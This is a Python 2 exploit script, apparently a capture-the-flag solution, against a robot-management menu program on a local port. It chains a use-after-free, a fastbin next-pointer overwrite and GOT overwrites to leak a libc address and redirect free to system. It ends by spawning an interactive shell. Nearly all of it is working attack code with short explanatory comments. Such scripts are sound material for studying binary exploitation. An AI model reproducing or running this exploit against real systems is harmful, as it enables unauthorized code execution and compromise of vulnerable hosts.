import socket, struct, telnetlib


def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)


def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
      data += f.read(1)
    return data


def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


def p(a): return struct.pack("<I",a)
def u(a): return struct.unpack("<I",a)[0]
def p64(a): return struct.pack("<Q",a)
def u64(a): return struct.unpack("<Q",a)[0]


def skip_menu():
    tmp = read_until(f, "Your choice : ")
    return tmp
def skip_robot_menu():
    return read_until(f, "Your choice :")


def add_robot(robot_id, value='', overwrite=False):
    skip_menu()
    f.write('1\n')
    skip_robot_menu()

    if not overwrite:
        f.write(str(robot_id) + '\n')
    else:
        f.write(str(robot_id))

    if robot_id in [2, 3, 6] or overwrite:
        read_until(f, 'Increase')
        read_until(f, ': ')
        f.write(str(value) + '\n')


def del_robot(robot_id):
    skip_menu()
    f.write('2\n')
    skip_robot_menu()
    f.write(str(robot_id) + '\n')


def change_robot(robot_id, name):
    skip_menu()
    f.write('3\n')
    skip_robot_menu()
    print 'Change {}'.format(robot_id)
    f.write(str(robot_id) + '\n')
    read_until(f, "Robot's name:")
    print 'Change to {}'.format(name)
    #f.write(name + '\n')
    f.write(name)

def leak_libc():
    import re
    skip_menu()
    f.write('4\n')
    pat = 'Thx (.*)!'

    read_until(f, '# ')
    data = read_until(f)
    print data
    print re.search(pat, data).group(1)

    addr = u64(re.search(pat, data).group(1).ljust(8, '\0'))
    return addr

s, f = sock("127.0.0.1", 4088)

main_ptr = 0x40185a
offset_calloc = 0x84d10
offset_system = 0x45390

# Bender
# Pointer to Bender's heap will be still stored even after the free.
print '[+] Add and delete Bender'
add_robot(2, 4)
del_robot(2)

# Consolidate freed Bender chunk with top,
# so the next calloc will return the same area as the previous bender.
# Add and free Billionaire (the calloc size is large so it will trigger consolidate)
print '[+] Add and delete Billionaire'
add_robot(5)
del_robot(5)

# Alloc devil and overwrite Bender's flag at the same time.
# The allocation here will return the same address as the previous bender.
print '[+] Add and delete Devil'
print '[+] Overwrite Bender flag'
add_robot('3\0\0\0\1', 5, True)
# After this free Bender's & devil's heap pointer will be freed,
# because they are pointing to the same address.
# Since bender's flag is overwritte we can edit the freed chunk.
del_robot(3)

# Edit bender's name so the freed fastbin chunk's next_ptr will poin to an address
# 0x13 bytes before the robots' heap array.
print '[+] Point next_ptr to {}'.format(hex(0x6030cd))
change_robot(2, p64(0x6030cd))

# The next, next calloc will return the desired address,
# which is 3 bytes before the robots' heap array.
add_robot(3, 5)
print '[+] This calloc will return desired address'
add_robot(6, 5) # DESIRED ADDRESS

addr_got_calloc_entry = 0x603070
addr_got_exit_entry = 0x603098
addr_heap_array = 0x6030dd # Specifically 3 bytes before the heap array

payload = str()
payload += 'sh\0'
payload += p64(addr_got_calloc_entry)
payload += p64(addr_got_calloc_entry)
payload += p64(addr_got_calloc_entry)
payload += p64(addr_got_exit_entry) # robot_id: 1, tinny tim, no additional values
payload += p64(addr_got_calloc_entry)
payload += p64(addr_heap_array) # robot_id: 5
payload += struct.pack('IIIIIIIIQ', 0, 1, 1, 1, 1, 1, 1, 0, 3)
change_robot(6, payload)

print '[+] Change exit to main'
change_robot(1, p64(main_ptr))

addr_libc_base = leak_libc() - offset_calloc
addr_system = addr_libc_base + offset_system
print '[+] adddr_libc_base = {}'.format(hex(addr_libc_base))

addr_got_free_entry = 0x603018
payload = str()
payload += 'sh\0'
payload += p64(addr_got_calloc_entry)
payload += p64(addr_got_calloc_entry)
payload += p64(addr_got_calloc_entry)
payload += p64(addr_got_free_entry) # robot_id: 1, tinny tim, no additional values
payload += p64(addr_got_calloc_entry)
payload += p64(addr_heap_array) # robot_id: 5, this will point to 'sh\0'
change_robot(5, payload)

print '[+] Change free to system'
change_robot(1, p64(addr_system))
print '[+] Start shell...'
del_robot(5)

shell(s)
